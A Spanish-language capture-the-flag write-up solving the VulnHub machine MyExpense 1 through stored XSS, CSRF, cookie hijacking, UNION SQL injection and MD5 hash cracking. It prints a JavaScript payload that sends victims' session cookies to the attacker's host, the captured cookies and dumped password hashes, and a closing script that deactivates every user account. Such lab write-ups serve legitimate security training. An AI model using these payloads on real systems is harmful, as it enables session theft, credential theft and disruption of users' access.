---
layout: single
title: MyExpensive 1 - VulnHub
excerpt: "En este post vamos a estar realizando una maquina linux de la plataforma de VulnHub donde tenemos que recuperar €750 de un usuario llamado Samuel que fue despedido de la compañia donde trabajaba y tenemos que aprovercharnos de un XSS tambien es vulnerable a SQL Injection ademas vamos con el XSS y un CSRF vamos a hacer un Cookie Hijacking para estar convirtiendonos en otros usuarios con mas privilegios y al final llegar a enviarnos nuestro dinero de vuelta"
date: 2023-03-29
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-myexpen/icon.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
  - infosec
  - Spanish
tags:  
  - XSS (Cross-Site Scripting)
  - CSRF (Cross-Site Request Forgery)
  - Cookie Hijacking
  - SQL Injection
  - Cracking Hashes
---

<p align="center">
<img src="/assets/images/vh-writeup-myexpen/icon.png">
</p>


En la pagina web de VulnHub donde esta la maquina nos estan diciendo informacion sobre ella <https://www.vulnhub.com/entry/myexpense-1,405/> 

Basicamente nos explican que somos Samuel y fuimos despedidos de una empresa y tenemos que recuperar nuestro dinero de vuelta que son `$750` euros ademas nos dicen que estamos en el estacionamienta de la empresa y seguimos teniendo acceso a la wifi interna

Nuestras credenciales que nos comparten son : `samuel:fzghn4lw`

![](/assets/images/vh-writeup-myexpen/Web1.png)

## PortScan 

```bash
❯ sudo arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f1:59:4d, IPv4: 192.168.100.15
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1	b0:76:1b:40:12:c7	(Unknown)
192.168.100.12	80:30:49:81:dc:ad	(Unknown)
192.168.100.38	00:0c:29:5a:76:a1	VMware, Inc.
```

```bash
❯ ping -c 1 192.168.100.38
PING 192.168.100.38 (192.168.100.38) 56(84) bytes of data.
64 bytes from 192.168.100.38: icmp_seq=1 ttl=64 time=0.743 ms

--- 192.168.100.38 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.743/0.743/0.743/0.000 ms
❯ 
❯ whichSystem.py 192.168.100.38

192.168.100.38 (ttl -> 64): Linux

```

```bash
❯ sudo nmap -sCV -p80,33975,41579,54495,56725 192.168.100.38 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 18:09 CST
Nmap scan report for 192.168.100.38
Host is up (0.00034s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
| http-robots.txt: 1 disallowed entry 
|_/admin/admin.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
33975/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
41579/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
54495/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
56725/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
```

```bash
❯ sudo nmap --script http-enum -p80 192.168.100.38 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 18:15 CST
Nmap scan report for 192.168.100.38
Host is up (0.00028s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /admin/admin.php: Possible admin folder
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:5A:76:A1 (VMware)

```

## Enumeracion

```ruby
❯ whatweb http://192.168.100.38
http://192.168.100.38 [200 OK] Apache[2.4.25], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.100.38], Title[Futura Business Informatique GROUPE - Conseil en ingénierie]
```

Vemos esto desde consola

```bash
❯ curl -s -X GET http://192.168.100.38/robots.txt
User-agent: *
Disallow: /admin/admin.php
```

Asi se ve la pagina web supongo que esos eran nuestros compañeros de trabajo 

![](/assets/images/vh-writeup-myexpen/Web2.png)

No podemos registrarnos por que nuestra cuenta esta inactiva y tenemos que contactar al admin pero bueno vamos a ver mas rutas que nos reporto `nmap`

![](/assets/images/vh-writeup-myexpen/Web3.png)

Nuestro nombre de usuario es `slamotte` y bueno podemos ver usuarios y vemos que nosotros estamos inactivos por que nos despidieron de la empresa

![](/assets/images/vh-writeup-myexpen/Web4.png)

Vamos a probar las contraseñas para ver si podemos conectarnos con el usuario `slamotte` y la password que tenemos pero nos dicen que nuestra cuenta fue bloqueada

![](/assets/images/vh-writeup-myexpen/Web5.png)

Vamos a registrarnos si pones el cursor donde esta el boton de `Sign up` no te va a dejar pero bueno podemos manipular eso

![](/assets/images/vh-writeup-myexpen/Web6.png)

De primeras esta `disabled`

![](/assets/images/vh-writeup-myexpen/Web7.png)

Ahora lo vamos a quitar

![](/assets/images/vh-writeup-myexpen/Web8.png)

Y ya pudimos registrarnos

![](/assets/images/vh-writeup-myexpen/Web9.png)

Y vemos que si se registro pero esta inactiva por que se necesita que el administrador la active 

![](/assets/images/vh-writeup-myexpen/Web10.png)

Pero bueno vemos nuestro output reflejado por que tenemos control de los valores asi que podemos probar un `XSS` desde la parte de registrar una cuenta

Vamos a tratar de cargar un recurso externo por que si hacemos una alerta y se conecta un usuario pues va a ver la alerta y eso llama la atencion pero antes nos tenemos que montar un servidor `http` para ver si nos llega la peticion

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


```

Le das a `Sign up!` si no de te deja quita el `disabled`

![](/assets/images/vh-writeup-myexpen/Web11.png)

Se creo

![](/assets/images/vh-writeup-myexpen/Web12.png)

Ahora si recargamos esta parte recibimos las peticiones

![](/assets/images/vh-writeup-myexpen/Web13.png)

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.38 - - [28/Mar/2023 18:47:27] code 404, message File not found
192.168.100.38 - - [28/Mar/2023 18:47:27] "GET /zi.js HTTP/1.1" 404 -
192.168.100.15 - - [28/Mar/2023 18:47:50] code 404, message File not found
192.168.100.15 - - [28/Mar/2023 18:47:50] "GET /zi.js HTTP/1.1" 404 -
192.168.100.15 - - [28/Mar/2023 18:47:50] code 404, message File not found
192.168.100.15 - - [28/Mar/2023 18:47:50] "GET /zi.js HTTP/1.1" 404 -
192.168.100.15 - - [28/Mar/2023 18:47:51] code 404, message File not found
192.168.100.15 - - [28/Mar/2023 18:47:51] "GET /zi.js HTTP/1.1" 404 -
192.168.100.15 - - [28/Mar/2023 18:47:51] code 404, message File not found
```

Vamos a ponernos otra vez con un servidor `http` con `Python3` para ver si algun usuario que revisa eso y si esta logueado nos de mas informacion por que nosotros al estar logueados nos otorgan nuestra cookie sesion entonces el usuario que revisa tambien tiene que estar logeado 

```bash
192.168.100.38 - - [28/Mar/2023 18:51:57] "GET /zi.js HTTP/1.1" 404 -
```

Si nos vamos ala consola vemos que esa es nuestra cookie

![](/assets/images/vh-writeup-myexpen/Web14.png)

Bueno vemos que si hacemos esto pues nos crea una alerta pero tambien podemos indicar que la `cookie` se nos envie a un servidor tercero

![](/assets/images/vh-writeup-myexpen/Web15.png)

Vamos a crear un archivo `.js` se va a tramitar una peticion por `GET` y cuando la victima por detras interpreta este recurso por `XSS` por detras la peticion se va a tramitar a mi peticion web y nos va a llegar la `cookie` de sesion a nuestra servidor web del usuario

```javascript
❯ catn zi.js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.15/?cookie=' + document.cookie);
request.send();
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y nos llega la `cookie`

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.38 - - [28/Mar/2023 19:06:31] "GET /zi.js HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 19:06:31] "GET /?cookie=PHPSESSID=20umug3e0lhsso701tpu73b0s1 HTTP/1.1" 200 -

```

Vamos a copearnos la `cookie` para ver si podemos hacer un `Cookie Hijacking`

Entonces ponemos la `cookie` hay y hacemos un ctrl+r

![](/assets/images/vh-writeup-myexpen/Web16.png)

Pero nos dice que el administrador solo puedo estar autenticado una unica vez

![](/assets/images/vh-writeup-myexpen/Web17.png)

Pero bueno algo que podemos hacer es que nuestra cuenta de Samuel que fue despedido si ponemos el cursor en la parte de `Inactive` y damos click nos lleva a esto se esta tratando de activar la cuenta pero no podemos solo el administrador

![](/assets/images/vh-writeup-myexpen/Web18.png)

Podemos modificar el archivo que teniamos antes para que ahora lo que haga es que tramite una peticion al link que le vamos a pasar que es el que vimos en la imagen anterior para que active la cuenta de `Samuel` esto es como un tipo `CSRF` aprovechandonos del `XSS`

```bash
❯ catn zi.js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=11&status=active');
request.send();
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.15 - - [28/Mar/2023 19:20:03] "GET /zi.js HTTP/1.1" 200 -
```

Recargamos la pagina y vemos que nos activo la cuenta 

![](/assets/images/vh-writeup-myexpen/Web19.png)

Ahora que esta activada vamos a logiarnos con las credenciales que tenemos

`slamotte:fzghn4lw`

![](/assets/images/vh-writeup-myexpen/Web20.png)

Si nos vamos `Expense Reports` y vemos nuestro dinero

Bueno vamos a darle en la parte verde

![](/assets/images/vh-writeup-myexpen/Web21.png)

Esta `submitted` pero bueno alguien tiene que validarlo asi que aun no hemos terminado 

![](/assets/images/vh-writeup-myexpen/Web22.png)

Si nos vamos a nuestro perfil vemos que nuestro manager es `Manon Riviere`

![](/assets/images/vh-writeup-myexpen/Web23.png)

Vemos que `mriviere` pues es `Manager`

![](/assets/images/vh-writeup-myexpen/Web24.png)

Si nos vamos al `home` vemos un chat y nuestro manager esta hablando hay

![](/assets/images/vh-writeup-myexpen/Web25.png)

Y bueno si los usuarios que estan en el chat estan conectados podemos aprovecharnos del `XSS` para tratar de robarles la `cookie` de sesion

```javascript
❯ catn zi.js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.15:8080/?gracias=' + document.cookie);
request.send();
```

Vamos a enviar el mensaje y le das a `Post your message`

![](/assets/images/vh-writeup-myexpen/Web26.png)

Ahora ponemos el servidor `http` con `python3` con el puerto que pusimos

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Y nos llegan `cookies`

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.100.38 - - [28/Mar/2023 20:14:00] "GET /zi.js HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:00] "GET /?gracias=PHPSESSID=031jhhj0m30342qq0dkoauhqm5 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:00] "GET /?gracias=PHPSESSID=031jhhj0m30342qq0dkoauhqm5 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:03] "GET /zi.js HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:03] "GET /?gracias=PHPSESSID=cf8b1vo86tnjmj90pa6c8mai90 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:03] "GET /?gracias=PHPSESSID=cf8b1vo86tnjmj90pa6c8mai90 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:04] "GET /zi.js HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:04] "GET /?gracias=PHPSESSID=v39g0413m0mtv3f7g3s5aendf6 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:04] "GET /?gracias=PHPSESSID=v39g0413m0mtv3f7g3s5aendf6 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:11] "GET /zi.js HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:11] "GET /?gracias=PHPSESSID=20umug3e0lhsso701tpu73b0s1 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:23] "GET /zi.js HTTP/1.1" 304 -
192.168.100.38 - - [28/Mar/2023 20:14:23] "GET /?gracias=PHPSESSID=cf8b1vo86tnjmj90pa6c8mai90 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:23] "GET /?gracias=PHPSESSID=cf8b1vo86tnjmj90pa6c8mai90 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:24] "GET /zi.js HTTP/1.1" 304 -
192.168.100.38 - - [28/Mar/2023 20:14:24] "GET /?gracias=PHPSESSID=v39g0413m0mtv3f7g3s5aendf6 HTTP/1.1" 200 -
192.168.100.38 - - [28/Mar/2023 20:14:24] "GET /?gracias=PHPSESSID=v39g0413m0mtv3f7g3s5aendf6 HTTP/1.1" 200 -
```

Nuestro objetivo es convertirnos en `mriviere`

Y bueno vamos a cambiar la `cookie` en la parte de `Storage` y cuando cambies la `cookie` simplemente vuelve a dar click en el link

![](/assets/images/vh-writeup-myexpen/Web27.png)

Esta cookie `031jhhj0m30342qq0dkoauhqm5` pertenece al objetivo si ninguna cookie te funciona para el objectivo simplemente deja corriendo mas tiempo el servidor `http` para que te lleguen mas cookies y las vas probando asta que estes como el usuario

![](/assets/images/vh-writeup-myexpen/Web28.png)

Si nos vamos a la parte de `Expense Reports` vemos que hay tenemos la peticion de devolverle los `750€` pavos a samuel 

![](/assets/images/vh-writeup-myexpen/Web29.png)

Y bueno le das click en el boton verde para validar la accion

Y bueno pues fue validada pero aun no tenemos nuestro dinero

![](/assets/images/vh-writeup-myexpen/Web30.png)

Si nos vamos a nuestro perfil pues ahora nuestro manager es `Paul Baudouin`

![](/assets/images/vh-writeup-myexpen/Web31.png)

Este usuario esta dentro del grupo donde estan los que se encargan las finanzas de la empresa vamos ver de que forma nos podemos convertir en este usuario

![](/assets/images/vh-writeup-myexpen/Web32.png)

Si nos vamos ala parte de `Rennes` vemos una `ulr` ya algo llamativa

![](/assets/images/vh-writeup-myexpen/Web33.png)

Vamos a ver si es vulnerable a `SQL Injection`

Y bueno nos da un error

![](/assets/images/vh-writeup-myexpen/Web34.png)

Vamos a quitar la `'` y a comentar el resto de la query para ver si la query ahora esta bien

![](/assets/images/vh-writeup-myexpen/Web35.png)

Ahora vamos a hacer un ordenamiento de los datos para ver cuantas columnas hay y vemos el output

![](/assets/images/vh-writeup-myexpen/Web36.png)

Vamos a ver el nombre de la base de datos

![](/assets/images/vh-writeup-myexpen/Web37.png)

Vamos a ver que usuario esta corriendo la base de datos

![](/assets/images/vh-writeup-myexpen/Web38.png)

La query por detras no engloba comillas es por eso que la `query` funciona aun asi

Vamos a ver si hay alguna tabla de la base de datos actualmente en uso que tenga credenciales

Pero antes vamos a enumerar todas las bases de datos

![](/assets/images/vh-writeup-myexpen/Web39.png)

Y bueno nos vamos a quedar con `myexpense` vamos a ver si podemos obtener sus tablas y estas son las tablas

![](/assets/images/vh-writeup-myexpen/Web40.png)

Ahora vamos a enumerar las columnas

```
http://192.168.100.38/site.php?id=2 union select 1,column_name from information_schema.columns where table_schema='myexpense' and table_name='user'-- -
```

![](/assets/images/vh-writeup-myexpen/Web41.png)

Vamos directamente por `username` y `password`

```
http://192.168.100.38/site.php?id=2 union select 1,group_concat(username,0x3a,password) from user-- -
```

![](/assets/images/vh-writeup-myexpen/Web42.png)

Y bueno hay que copiarnos todo que es muy largo (eso dijo ella) el resultado xd

Con esto ordenamos todo

![](/assets/images/vh-writeup-myexpen/Web43.png)

```ruby
❯ catn data
afoulon:124922b5d61dd31177ec83719ef8110a
pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a
rlefrancois:ef0dafa5f531b54bf1f09592df1cd110
mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc
mnguyen:f7111a83d50584e3f91d85c3db710708
pgervais:2ba907839d9b2d94be46aa27cec150e5
placombe:04d1634c2bfffa62386da699bb79f191
triou:6c26031f0e0859a5716a27d2902585c7
broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27
brenaud:2204079caddd265cedb20d661e35ddc9
slamotte:21989af1d818ad73741dfdbef642b28f
nthomas:a085d095e552db5d0ea9c455b4e99a30
vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3
rmasson:ebfc0985501fee33b9ff2f2734011882
cebolla7:291189fee2e5763458b3f07057be4bca
perro:25d55ad283aa400af464c76d713c07ad
edson:3e6c4d948afe4134336d03066cf35724
juan:080f9ba76405091e4a9867bb0d978d5c
```

El usuario que nos interesa es el segundo 

```bash
pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a
```

Si su contraseña es debil por que esta en `MD5` podemos usar esta web para no usar `john`

<https://hashes.com/en/decrypt/hash>

![](/assets/images/vh-writeup-myexpen/Web44.png)

`pbaudouin:HackMe`

Vamos a ver si podemos logearnos con sus credenciales mediante el panel de login

Y funciono

![](/assets/images/vh-writeup-myexpen/Web45.png)

Y bueno vemos que podemos enviar el pago a samuel 

![](/assets/images/vh-writeup-myexpen/Web46.png)

Pago enviado

![](/assets/images/vh-writeup-myexpen/Web47.png)

Ahora tenemos que revisar si le llego el pago y si terminamos el CTF hemos aprovechado varias vulnerabilidades para que la empresa le regrese el dinero que le deben a samuel 

![](/assets/images/vh-writeup-myexpen/Final.png)

Si esto fuera un ecenario real no dudo que hay empresas con estas fallas de seguridad podrias inabilitar todas las cuentas para que nadie pueda trabajar asta que las vuelvan a activar

```javascript
❯ catn zi.js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=14&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=13&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=12&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=11&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=10&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=9&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=8&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=7&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=6&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=5&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=4&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=3&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=2&status=inactive');
request.send();

var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.100.38/admin/admin.php?id=1&status=inactive');
request.send();
```

O igual para que sea mas corto el codigo podrias hacer un bucle 

```javascript
for (var i = 14; i >= 1; i--) {
  var request = new XMLHttpRequest();
  request.open('GET', 'http://192.168.100.38/admin/admin.php?id=' + i + '&status=inactive');
  request.send();
}

```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.38 - - [28/Mar/2023 21:12:21] "GET /zi.js HTTP/1.1" 200 -


```

![](/assets/images/vh-writeup-myexpen/Final2.png)




































































































